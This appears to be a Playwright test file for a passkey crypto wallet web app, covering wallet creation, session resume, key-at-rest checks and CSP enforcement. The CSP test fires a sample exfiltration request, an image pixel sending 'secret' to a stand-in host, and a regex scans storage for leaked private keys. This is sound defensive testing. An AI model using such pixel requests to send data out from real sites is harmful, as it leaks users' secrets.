import { expect, test, type Page } from "@playwright/test";
import { dismissOnboardingWhenItBlocks } from "./onboarding";

const ADDRESS = /^0x[0-9a-fA-F]{40}$/;

/** A platform authenticator that auto-approves, with the PRF extension mera derives the key from. */
async function addPasskeyAuthenticator(page: Page) {
  const cdp = await page.context().newCDPSession(page);
  await cdp.send("WebAuthn.enable");
  await cdp.send("WebAuthn.addVirtualAuthenticator", {
    options: {
      protocol: "ctap2",
      ctap2Version: "ctap2_1",
      transport: "internal",
      hasResidentKey: true,
      hasUserVerification: true,
      isUserVerified: true,
      hasPrf: true,
      automaticPresenceSimulation: true,
    },
  });
  await dismissOnboardingWhenItBlocks(page);
  return cdp;
}

async function connect(page: Page) {
  // The status button connects the passkey account directly. ConnectWalletDialog
  // opens only through requestWalletConnect(), for controls gated on a wallet.
  await page.getByTestId("connect-button").click();
  await expect(page.getByTestId("wallet-address")).toHaveText(ADDRESS, { timeout: 30_000 });
}

test("creates a passkey wallet and shows the full address and session expiry", async ({ page }) => {
  await addPasskeyAuthenticator(page);
  await page.goto("/deposit");
  await connect(page);
  // "Session ends", not "Session": the fallback copy "Session active" would hide a failing status().
  await expect(page.getByTestId("wallet-expiry")).toContainText("Session ends");
});

test("resumes the session after reload without prompting, with the same address", async ({ page }) => {
  await addPasskeyAuthenticator(page);
  await page.goto("/deposit");
  await connect(page);
  const before = await page.getByTestId("wallet-address").innerText();

  await page.reload();
  await expect(page.getByTestId("wallet-address")).toHaveText(before, { timeout: 30_000 });
});

test("locking the wallet then unlocking with the same passkey yields the same address", async ({ page }) => {
  await addPasskeyAuthenticator(page);
  await page.goto("/deposit");
  await connect(page);
  const before = await page.getByTestId("wallet-address").innerText();

  await page.getByTestId("disconnect-button").click();
  await expect(page.getByTestId("connect-button")).toBeVisible();

  await connect(page);
  await expect(page.getByTestId("wallet-address")).toHaveText(before);
});

// Scope of this guarantee: the Playwright server sets no NEXT_PUBLIC_WALLET_ORIGIN, so the
// frame is same-origin here. This proves the session is encrypted at rest, not that the
// production cross-origin split holds; proxy.test.ts covers the host lockdown.
test("the key never reaches app-origin storage in plaintext", async ({ page }) => {
  await addPasskeyAuthenticator(page);
  await page.goto("/deposit");
  await connect(page);
  const dump = await page.evaluate(() => JSON.stringify({ ...localStorage }));
  // The credential pointer and an encrypted session may be present; a 64-hex private key must not be.
  expect(dump).not.toMatch(/(^|[^0-9a-fA-F])(0x)?[0-9a-fA-F]{64}([^0-9a-fA-F]|$)/);
});

test("the app page ships the enforced meta CSP and tags every script with the request nonce", async ({ page }) => {
  await page.goto("/deposit");
  await expect(page.locator('meta[http-equiv="Content-Security-Policy"]')).toHaveAttribute(
    "content",
    "object-src 'none'; base-uri 'self'; img-src 'self' data: blob:",
  );
  // The image rule is ENFORCED, not reported: a picture from anywhere else never leaves the browser.
  let left = false;
  await page.route("https://collect.example/**", (route) => ((left = true), route.abort()));
  const blocked = await page.evaluate(
    () =>
      new Promise<boolean>((resolve) => {
        // The report-only policy names img-src too and fires its own event; only the ENFORCED one counts here.
        document.addEventListener("securitypolicyviolation", (event) => {
          if (event.effectiveDirective === "img-src" && event.disposition === "enforce") resolve(true);
        });
        const image = new Image();
        image.src = "https://collect.example/pixel.png?d=secret";
        setTimeout(() => resolve(false), 3000);
      }),
  );
  expect(blocked).toBe(true);
  expect(left).toBe(false);
  // Browsers hide the nonce attribute from the DOM, so read it from the served HTML.
  const html = await (await page.request.get("/home")).text();
  const scripts = html.match(/<script\b[^>]*>/g) ?? [];
  expect(scripts.length).toBeGreaterThan(0);
  expect(scripts.filter((tag) => !/\snonce="[^"]+"/.test(tag))).toEqual([]);
});
